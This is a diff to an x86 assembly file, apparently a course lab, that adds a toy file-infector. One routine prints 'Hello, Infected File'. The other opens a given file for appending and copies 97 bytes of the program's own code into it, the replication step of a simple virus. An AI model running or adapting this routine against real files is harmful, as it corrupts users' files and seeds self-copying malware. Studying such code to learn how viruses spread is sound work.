@@ -1,6 +1,10 @@
+section .data
+    vir_messege:  db "Hello, Infected File" ,10,0
 section .text
 global _start
 global system_call
+global infection
+global infector
 extern main
 _start:
     pop    dword ecx    ; ecx = argc
@@ -38,3 +42,51 @@ system_call:
     add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
+code_start:
+    infection:
+        push    ebp             ; Save caller state
+        mov     ebp, esp
+        sub     esp, 4          ; Leave space for local var on stack
+        pushad                  ; Save some more caller state
+
+        mov     eax, 4             ; Copy function args to registers: leftmost...        
+        mov     ebx, 1             ; Next argument...
+        mov     ecx, vir_messege   ; Next argument...
+        mov     edx, 22            ; Next argument...
+        int     0x80               ; Transfer control to operating system
+        mov     [ebp-4], eax    ; Save returned value...
+
+        popad                   ; Restore caller state (registers)
+        mov     eax, [ebp-4]    ; place returned value where caller can see it
+        add     esp, 4          ; Restore caller state
+        pop     ebp             ; Restore caller state
+        ret                     ; Back to caller
+
+    infector:
+        push    ebp             ; Save caller state
+        mov     ebp, esp
+        pushad                  ; Save some more caller state
+
+        mov     eax, 5                          ; Open System Call       
+        mov     ebx, dword [ebp + 8]            ; Pathname of File
+        mov     ecx, 1025                       ; O_WRONLY | O_APPEND
+        mov     edx, 0777                       ; FIle permission
+        int     0x80                            ; Transfer control to operating system
+
+        mov     esi, eax                        ; Save returned value from first System Call
+
+        mov     eax, 4                           ; Write System Call        
+        mov     ebx, esi                           ; file descriptor
+        mov     ecx, code_start                 ; Pointer to the beginnig of code_start
+        mov     edx, 97                          ; size of bytes to write
+        int     0x80                             ; Transfer control to operating system
+
+        mov     eax, 6             ; Close System Call        
+        mov     ebx, esi             ; file descriptor
+        int     0x80               ; Transfer control to operating system
+
+        popad                   ; Restore caller state (registers)
+        pop     ebp             ; Restore caller state
+        ret                     ; Back to caller
+code_end:
+
